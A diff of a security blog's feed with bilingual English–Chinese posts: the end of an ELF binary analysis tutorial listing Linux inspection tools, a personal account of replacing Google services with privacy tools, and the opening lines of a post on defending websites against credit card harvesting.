+&lt;/blockquote&gt;
+
+&lt;blockquote&gt;
+  &lt;blockquote&gt;
+    &lt;p&gt;$ ldd /bin/ps&lt;br /&gt;
+linux-vdso.so.1 =&amp;gt; (0x00007ffe5ef0d000)&lt;br /&gt;
+libprocps.so.3 =&amp;gt; /lib/x86_64-linux-gnu/libprocps.so.3 (0x00007f8959711000)&lt;br /&gt;
+libc.so.6 =&amp;gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f895934c000)&lt;br /&gt;
+/lib64/ld-linux-x86-64.so.2 (0x00007f8959935000)&lt;/p&gt;
+  &lt;/blockquote&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Tip:&lt;/strong&gt; To see underlying dependencie, it might be better to use the lddtree utility instead.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;小技巧:&lt;/strong&gt; 要看到底層依賴關係，使用 lddtree 工具來代替。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;what-did-we-learn---我們學到了什麼-&quot;&gt;What Did We Learn ? / 我們學到了什麼 ?&lt;/h2&gt;
+
+&lt;p&gt;ELF files are for execution, or for linking. Depending on one of these goals, it contains the required segemnts or sections. Segments are viewed by the kernel and mapped into memory (using mmap). Sections are viewed by the linker to create executable code or shared objects.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ELF 檔案是用來執行或是連結的。基於其中一個目標，而包含要求的區段或是節區。區段是核心的觀點並映射到記憶體中(使用 mmap)。節區是連結器的觀點用來創造可執行程式碼或是分享物件。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The ELF file type is very flexible and provides support for multiple CPU types, machine architectures, and operating systems. It is also very extensible: each file is differently constructed, depending on the required parts.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;ELF 檔案類型是非常彈性且提供許多支援的 CPU 類型、機器架構與作業系統。同時它具有可擴展性: 基於不同的要求，每個檔案有不同的構造。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Headers form an important part of the file, describing exactly the contents of and ELF file. By using the right tools, you can gain a basic understanding on the purpose of the file. From there on, you can further “interrogate” the binaries by determining the related functions it uses, or strings stored in the file. A great start for those who are into malware research, or want to know better how processes behave (or not behave!).&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;標頭形成一個檔案重要的部分，精確的描述 ELF 檔案的內容。透過使用對的工具你可以獲得對檔案的目的有一個基本的了解。從現在開始，你可以進一步的”質問”二進位檔取決於，它使用的相關函式或是儲存在檔案你的字串。對於惡意軟體研究有興趣的人是一個好的開始，或是想要對程序行為有更好的了解 (或是程序不乖!)。(編按: behave 有乖巧的意味，這裡作者玩了個雙關)&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&quot;packages--套裝軟體&quot;&gt;Packages / 套裝軟體&lt;/h3&gt;
+
+&lt;p&gt;Most Linux systems will already have the the binutils package installed. Other packages might help with showing much more details. Having the right toolkit might simplify your work, especially when doing analysis or learning more about ELF files. So we have collected a list of packages and the related utilities in it.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;多數的 Linux 系統將已經安裝了 &lt;code class=&quot;highlighter-rouge&quot;&gt;binutils&lt;/code&gt; 套裝軟體(編按: 原文多打一個 the)。其他套裝軟體對顯示更多詳細資訊可能會有幫助，擁有隊的工具箱可以簡化你做的工。特別是在分析或是學習更多有關 ELF 檔案的時候。所以我們蒐集了一個套裝軟體清單與其相關的工具。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h4 id=&quot;elfutils&quot;&gt;elfutils&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;/usr/bin/eu-addr2line&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-ar – alternative to ar, to create, manipulate archive files&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-elfcmp&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-elflint – compliance check against gABI and psABI specifications&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-findtextrel – find text relocations&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-ld – combining object and archive files&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-make-debug-archive&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-nm – display symbols from object/executable files&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-objdump – show information of object files&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-ranlib – create index for archives for performance&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-readelf – human-readable display of ELF files&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-size – display size of each section (text, data, bss, etc)&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-stack – show the stack of a running process, or coredump&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-strings – display textual strings (similar to strings utility)&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-strip – strip ELF file from symbol tables&lt;/li&gt;
+  &lt;li&gt;/usr/bin/eu-unstrip – add symbols and debug information to stripped binary&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;Notes: the elfutils package is a great start, as it contains most utilities to perform analysis.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;註: elfutils 包是一個好的開始，因為它包含了最多用來執行分析的功能&lt;/em&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;elfkickers&quot;&gt;elfkickers&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;/usr/bin/ebfc – compiler for &lt;a href=&quot;https://en.wikipedia.org/wiki/Brainfuck&quot;&gt;Brainfuck&lt;/a&gt; programming language&lt;/li&gt;
+  &lt;li&gt;/usr/bin/elfls – shows program headers and section headers with flags&lt;/li&gt;
+  &lt;li&gt;/usr/bin/elftoc – converts a binary into a C program&lt;/li&gt;
+  &lt;li&gt;/usr/bin/infect – tool to inject a dropper, which creates setuid file in /tmp&lt;/li&gt;
+  &lt;li&gt;/usr/bin/objres – creates an object from ordinary or binary data&lt;/li&gt;
+  &lt;li&gt;/usr/bin/rebind – changes bindings/visibility of symbols in ELF file&lt;/li&gt;
+  &lt;li&gt;/usr/bin/sstrip – strips unneeded components from ELF file&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;Notes: the author of the ELFKickers package focuses on mainipulation of ELF files, which might be great to learn more when you find malformed ELF binaries.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;註: ELFKickers 的作者專注在操作 ELF 檔岸上，或許對想要學習畸形 ELF 二進位檔有幫助&lt;/em&gt;&lt;/p&gt;
+
+&lt;h4 id=&quot;pax-utils&quot;&gt;pax-utils&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;/usr/bin/dumpelf – dump internal ELF structure&lt;/li&gt;
+  &lt;li&gt;/usr/bin/lddtree – like ldd, with levels to show dependencies&lt;/li&gt;
+  &lt;li&gt;/usr/bin/pspax – list ELF/PaX information about running processes&lt;/li&gt;
+  &lt;li&gt;/usr/bin/scanelf – wide range of information, including PaX details&lt;/li&gt;
+  &lt;li&gt;/usr/bin/scanmacho – shows details for Mach-O binaries (Mac OS X)&lt;/li&gt;
+  &lt;li&gt;/usr/bin/symtree – displays a leveled output for symbols&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;em&gt;Notes: Several of the utilities in this package can scan recursively in a whole directory. Ideal for mass-analysis of a directory. The forcus of the tools is to gather PaX details. Besides ELF support, some details regarding Mach-O binaries can be extracted as well.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;註: 在這個套裝軟體中數個功能可以遞迴的掃描一整個目錄。用於對一個目錄的大量分析。這個工具聚焦的點在於集合 PaX 細節。除了 ELF 的支援，一些關於 Mach-O 二進位的細節也可以被萃取。&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;Example outputs&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;範例輸出&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;scanelf -a /bin/ps
+ TYPE    PAX   PERM ENDIAN STK/REL/PTL TEXTREL RPATH BIND FILE 
+ET_EXEC PeMRxS 0755 LE RW- R-- RW-    -      -   LAZY /bin/ps
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;prelink&quot;&gt;prelink&lt;/h4&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;/usr/bin/execstack – display or change if stack is executable&lt;/li&gt;
+  &lt;li&gt;/usr/bin/prelink – remaps/relocates calls in ELF files, to speed up process&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;example--範例&quot;&gt;Example / 範例&lt;/h2&gt;
+
+&lt;p&gt;If you want to create a binary yourself, simply create a small C program, and compile it. Here is an example, which opens /tmp/test.txt, reads the contents into a buffer and displays it. Make usre to create the related /tmp/test.txt file.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果你想要自己創造一個二進位檔，簡單的創建一個小型的 C 程式，並編譯它。這裡是一個範例，可以打開 /tmp/test.txt，將內容讀進一個緩衝區並顯示。記得要確認創建 /tmp/test.txt 檔案。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-clike&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
+
+int main(int argc, char **argv)
+{
+   FILE *fp;
+   char buff\[255\];
+
+   fp = fopen(&quot;/tmp/test.txt&quot;, &quot;r&quot;);
+   fgets(buff, 255, fp);
+   printf(&quot;%s\\n&quot;, buff);
+   fclose(fp);
+
+   return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This program can be compiled with: gcc -o test test.c&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這個程式用 &lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o test test.c&lt;/code&gt; 來編譯&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h2 id=&quot;more-sources--更多資料來源&quot;&gt;More sources / 更多資料來源&lt;/h2&gt;
+
+&lt;p&gt;If you like to know more, a good source would be to follow WikiPedias Executable and Linkable Format(ELF) page. Another good in-depth document: ELF_Format and the document authored by Brian Raiter (ELFkikers). For those who love to read sources, have a look at documented ELF structure header file from Apple. And them finally, if you really wnat to know how a binary works, test it with a disassembler tool like Hopper for Linux.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;如果你傾向於知道更多，一個好的來源包括維基百科 &lt;a href=&quot;https://en.wikipedia.org/wiki/Executable_and_Linkable_Format&quot;&gt;Executable and Linkable Format (ELF)&lt;/a&gt;頁面。另外一個詳盡的文件:作者與 ELFkickers 相同的著作 &lt;a href=&quot;http://www.skyfree.org/linux/references/ELF_Format.pdf&quot;&gt;ELF Format&lt;/a&gt;。對那些愛上閱讀原始資料，看一看這個從 Apple 的文件 &lt;a href=&quot;http://www.opensource.apple.com/source/dtrace/dtrace-90/sys/elf.h&quot;&gt;ELF structure header file&lt;/a&gt;。最後，如果你真的想要知道一個二進位檔案是如何運作的，使用像是 &lt;a href=&quot;https://www.hopperapp.com/&quot;&gt;Hopper for Linux&lt;/a&gt; 的反組譯工具來做測試。&lt;/p&gt;
+&lt;/blockquote&gt;</content><author><name>jhe</name></author><category term="Linux" /><category term="ELF" /><summary type="html">The 101 of ELF Binaries on Linux: Understanding and Analysis</summary></entry><entry><title type="html">珍惜隱私遠離 Google</title><link href="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html" rel="alternate" type="text/html" title="珍惜隱私遠離 Google" /><published>2018-03-08T00:00:00-08:00</published><updated>2018-03-08T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/08/taking-privacy-seriously-leaving-google-behind.html">&lt;h1 id=&quot;taking-privacy-seriously-leaving-google-behind&quot;&gt;Taking privacy seriously leaving google behind&lt;/h1&gt;
+
+&lt;p&gt;Recently, I made the decision to become a little more seucure on the internet. I don’t have much to hide except maybe bank account info, but I was struck by a Glenn Greenwald quote from a TED Talk he gave about privacy.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;最近，我做了成為一個在網際網路上多多一點安全的決定。除了我的銀行帳戶資訊我沒有什麼好隱藏的，但我被 Gleen Greenwald 在 TED 有關隱私的演講給打擊了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Over the last 16 months, as I’ve debated this issue around the world, every single time somebody has said to me, “I don’t really worry about invasions of privacy because I don’t have anything to hide.” I always say the same thing to them. I get out a pen, I write down my email address. I say, “Here’s my email address. What I want you to do when you get home is email me the passwords to all of your email accounts, not jsut the nice, respectable work one in your name, but all of them, because I want to be able to just troll through what it is your’re doing online, read what I want to read and publish whatever I find interesting. After all, if you’re not a bad person, if you’re doing nothing wrong, you should have nothing to hide.” Not a single person has taken me up on that offer.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;過去的16個月，我跟全世界辯論這個議題，當每次某個人對我說 “我並不擔心隱私權的侵犯，我並沒有甚麼東西好隱藏的。” 我總是對他們說一同樣的話。我拿出一枝筆，寫下我的電子郵件地址，並且對他們說 “這是我的電子郵件地址。我要你做的是，當你回到家就把你所有的電子郵件帳戶密碼寄給我，不只是要工作用漂漂亮亮的那個，而是要全部。因為我要能搜索你在網路上做的事情，知道且公布任何我想要知道的有趣事情。畢竟，如果你不是一個壞人，如果你沒有做任何不對的事情，你應該沒什麼好隱藏的。” 沒有一個人肯接受我的提議。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I find myself tired of knowing Google is going through the content of my emails and examining my searches to sell me things.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我發現自己已經厭倦於知道 Google 從頭到尾瀏覽我的電子郵件內容，並檢查我的搜尋紀錄，為的是賣東西給我。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I also know our new goverment (not that our old was too much better) is tracking the activities of anyone who is anti-fascist. I don’t trust them to follow the laws that would otherwise keep me secure from illegal search.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我也知道我們的新政府(我們的舊政府並沒有好一點)正在追蹤任何反法西斯分子的活動情形。我不相信只要遵守法律便能使我安全的遠離非法搜索。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So I set out to become more private and that meant leaving Google products and using encrypted, more secure alternatives.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以打算變得更有隱私，那就表示遠離 Google 產品並且使用加密與更安全的替代方案。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;So what I have I found ? Well, I have spent the last weeks and months testing products and making decisions on what I would do.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;所以我發現了甚麼 ? 哎呀，我費了數個月直到上個星期，都在測試產品並決定我開怎麼做。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here is what I found.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這是我的發現。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Browser:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;瀏覽器:&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;The first, maybe the easiest step was changing my browser away from Google’s Chrome browser. I decided to go with Firefox’s nightly builds because they seem to run faster and feel a bit more Chrome like, so the switch wouldn’t be so shocking. With Firefox account syncing options, it wasn’t hard to get my bookmarks synced across a few devices with ease.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;首先，或許最簡單的步驟是換掉我的 Google Chrome 瀏覽器。我決定使用 Firefox 的 nightly，因為它們似乎運行得更快而且感覺跟 Chrome 很像，所以移轉比較沒有障礙。用 Firefox 帳戶同步選項，自在的跨數個裝置同步我的書籤並不難。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I also installed some plugins, thanks to recommendations from PrivacyTools.io, a site you should frequent for tips on internet privacy. I am now running Ublock Origin to block ads and trackers along with Privacy Badger and HTTPS Everywhere.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我也安裝的了一些插件，感謝 PrivacyTools.io 的建議，一個你應該常常造訪的網站，獲取一些網路隱私的小技巧。我現正使用 Ublock Origin 來阻擋廣告與追蹤和 Privacy Badger 與 HTTPS Everywhere。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Alternatively, I run Tor Browser, a Firefox fork if I want an even greater layer of privacy.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;或者，我使用 Tor 瀏覽器，一個 Firefox 分支，如果想要更安全的隱私層級的話。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Search:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;搜尋:&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Who doesn’t use Google to find things? Sure, we all know that weird friend who users Yahoo still, or that one guy who still owns a Zune who uses Bing, but Google has it all.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;誰不使用 Google 來找尋事物? 當然，我們都有那種仍使用 Yahoo 的奇怪朋友，或是那個還擁有一台 Zune(編按: 微軟公司出品的可攜式媒體撥放器) 並使用 Bing 的人，但 Google 擁有一切。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I started with the always popular DuckDuckGo, but I found I didn’t get very good search results and it seemed to load really slow for me. Thankfully, thanks to PrivacyTools, I discovered &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我一開始使用很夯的 DuckDuckGo，但我發現我不能得到很好的搜尋結果而且它貌似對我來說載入的頗為龜速，謝天謝地，感謝 PrivacyTools，我偶然發現 &lt;a href=&quot;https://www.startpage.com/&quot;&gt;StartPage&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;StartPage anonymiszes your searches through Google, so you will still get the quality Google results without them seeing you, and without the ads, It easily integrates right into Firefox on desktop and mobile.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;StartPage 匿名化你的 Google 搜尋，所以你將仍然可以獲得有品質的 Google 結果而不備他們看見，還沒有廣告，它簡易的整合進了 Firefox 桌面板與移動版。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;VPN:&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;When it came to choosing a VPN, I went through many trials. I asked for recommendations and started with the most poular, Private Internet Access, but I didn’t like that they were based in the US, but also found their speeds not all that great. Next I tried NordVPN. The speeds were actually greate on my iPhone, but they don’t offer a native Linux app setting up their different servers was kind of pain.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;當我來到要選擇一個 VPN 時，我嘗試了好幾個實驗。我尋求了建議並從人氣最旺的開始，Private Internet Access(編按:一個匿名的私人 VPN 服務)，但我不喜歡它位在美國，但也因為他們的速度不是很理想。下一個我試了 NordVPN。在我的 iPhone 上速度不錯，但他們沒有原生 Linux 應用程式設定他們不同的伺服器是一大痛點。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Finally, I settled on one was recommended a few times, Mullvad. The price is good ($5/mo), and the speeds are wonderful. I use OpenVPN on my phone, but for my laptop running Linux Mint, and for my media server at home, and old Mac, they offer a native app which makes connecting easy.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;最後，我決定用被建議過數次的，&lt;a href=&quot;https://www.mullvad.net/&quot;&gt;Mullvad&lt;/a&gt;。價錢不錯 ($5/mo)，而且速度卓越。在手機上我使用 OpenVPN，還有我運行 Linux Mint 的筆記型電腦，還有我在家裡的數位媒體伺服器，跟舊 Mac，他們提供了原生應用程式可以很簡單的連接起來。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I also have a free VPN account with &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt;, and another with &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt;.
+These secondary options, which give me okay speeds, allow me backups if shomethings goes wrong with Mullvad.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我還有一個免費的 &lt;a href=&quot;https://protonvpn.com/&quot;&gt;ProtonVPN&lt;/a&gt; 帳戶，還有另一個 &lt;a href=&quot;http://www.riseup.net/&quot;&gt;RiseUp&lt;/a&gt; 的。這些次要選項，有著還 ok 的速度，在 Mullvad 出甚麼問題的時候可以讓我可以備用。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Communications:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;通訊:&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;While this wasn’t really part of this move, I wanted to recommend some texting, video and voice calling apps that are amazing. I am loving Wire, a chat app that has both desktop and mobile clients. Also, the very popular Signal app.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;雖然這並不真的是這個行動的一部分，我想要推薦一些令人驚奇的文字、影片與語音通話應用程式。我鍾愛 &lt;a href=&quot;http://www.wire.com/&quot;&gt;Wire&lt;/a&gt;，一個聊天應用程式同時有著桌面與移動客戶端。還有很火紅的應用程式 &lt;a href=&quot;https://signal.org/&quot;&gt;Signal&lt;/a&gt;。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;For file sharing, I have installed OnionShare.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我安裝了 OnionShare 來分享檔案。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;strong&gt;Email:&lt;/strong&gt;&lt;/p&gt;
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;電子郵件:&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;This was the last big piece of the puzzle. I have been on Gmail since they launched the first wave of invites. It’s a wonderful web based interface and a good mobile app. Replacing it wasn’t going to be easy. However, I do own my own domain, and figured it was time to use it.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;這是謎題的最後一個巨大的一片拼圖。在 Gmail 發動第一波測試邀請的時候，我就已經在使用了。那是一個美好的基於網頁的介面和一個好的移動裝置應用程式。要想取代它並不簡單。然而，我有擁有自己的域名，該是搞定並使用它的時候了。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;It came down to two providers for me. ProtonMail, makers of ProtonVPN, and Tutanota. Both offer a great service and allow custom domains on their paid accounts. Proton has a much nicer web and mobile interface, but Tutanota has been showing off its beta platform and it’s looking very promising.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;對我來說最後落在兩個供應商，ProtoMail，ProtonVPN 的製造者和 Tutanota。兩者都提供很棒的服務並且允許付費用戶自訂域名。Proton 有更好的網頁及移動裝置介面，但 Tutanota 正炫耀他們的測試平台，而且那看起來非常的有前途。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Here, it really came down to price for me. ProtonMail is $5/mo or $48 a year, while Tutanota is $12 a year.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;到了這個地步，對我來說就剩下價錢之爭了。ProtonMail 是一個月 $5 或一年 $48，Tutanota 則是一年 $12。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Given that Tutanota is open source, and they have a pipeline of amazing products in development, I pulled the trigger and moved my email there.&lt;/p&gt;
+
+&lt;p&gt;考慮到 Tutanota 為開放原始碼，且他們有一個開發中的令人驚嘆的產品管道。我下了決定並將我的電子郵件移到這裡。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;So what’s left?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;&lt;strong&gt;還剩下甚麼?&lt;/strong&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Well, first, here is what I am still using from Google:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;啊，首先這裡是我仍然使用中的 Google 產品:&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Gmail: While I have switched, I have nearly a decade of stuff on Gmail and accounts that still point here and important pepole how have this email address. I will slowly begin to migrate them away and likely end up at the point where I just forward all my mail away from here.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Gmail: 當我移轉後，我有一個將近十年的東西在 Gmail 與帳戶上仍然指向這裡，並且重要的人有這個電子郵件地址。我將緩慢的開始遷移他們，最後結束在將我所有的郵件都轉送離這裡。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Google Photos: They offer free backup of all my iPhone photos. I have more than 10,000 photos here and don’t have a solid replacement in place yet.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Google Photos: 他們提供免費的備份我所有的 iPhone 照片。我在這裡有多過一萬張照片，並且還沒有一個可靠的替代品。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;YouTube: I mean, I can’t escape this one.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Youtube: 我的意思是，我沒辦法離開這個。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Google+: Yeah,it’s still a thing. I use it to share articles I have written. It also improves search results for my work.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Google+: 對，這東西還存在。我使用它來分享我寫的文章。它同時也對我的工作改善了搜結果。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Google Authenticator: I use 2-Step Authentication for as many sites as will allow and most use this app. The only app based alternative to this is Authy, and if you look in the comments, it’s problematic.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Google Authenticator: 我在很多網站使用兩步驟驗證，且多數都與許這個應用程式。唯一的基於應用程式的替代方案是 Authy，而且如果你看向留言，它還是有問題的。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Google Maps: Anyone have recommendations on good replacement for this?&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Google Maps: 任何人對這個有好的建議替代品嗎?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I also still use Facebook and Twitter which are privacy nightmares of their own.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我也仍在使用隱私夢魘 Facebook 與 Twitter。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;I am also still looking for a good Google Docs replacement. I am testing out Dropbox Paper, and I use LibreOffice on Linux, but I’d like something I can use online more. The hunt continues.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我也還在尋找一個好的 Google Docs 替代品。我正在測試 Dropbox Paper，並且我在 Linux 上使用 LibreOffice，但我想要某些可以線上使用的。狩獵仍持續著。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;What are you using? What recommendations do you have as I continue to improve myh privacy journey?&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;你正在用甚麼? 對我繼續改善隱私之旅你有什麼建議?&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Share in the comments.&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;在留言分享&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;</content><author><name>jhe</name></author><category term="privacy" /><summary type="html">Taking privacy seriously leaving google behind</summary></entry><entry><title type="html">第2部分：如何阻止我從您的網站收集信用卡號碼和密碼</title><link href="https://security-onigiri.github.io//2018/03/07/2.html" rel="alternate" type="text/html" title="第2部分：如何阻止我從您的網站收集信用卡號碼和密碼" /><published>2018-03-07T00:00:00-08:00</published><updated>2018-03-07T00:00:00-08:00</updated><id>https://security-onigiri.github.io//2018/03/07/2</id><content type="html" xml:base="https://security-onigiri.github.io//2018/03/07/2.html">&lt;p&gt;我&lt;a href=&quot;https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5&quot;&gt;最近有寫了一篇文章，&lt;/a&gt;描述了我如何散布惡意代碼，以非常難以檢測的方式從數千個網站收集信用卡號和密碼。&lt;/p&gt;
+
+&lt;p&gt;這個帖子所收到的評論讓我充滿喜悅，多數表達了“令人不寒而慄”、“令人不安”和“非常恐怖”等情緒。（就像我在舞池裡得到的讚美一樣）&lt;/p&gt;
+
+&lt;p&gt;在這個後續的文章中，我想停止加深恐懼，並提出一些實際的建議。&lt;/p&gt;
+
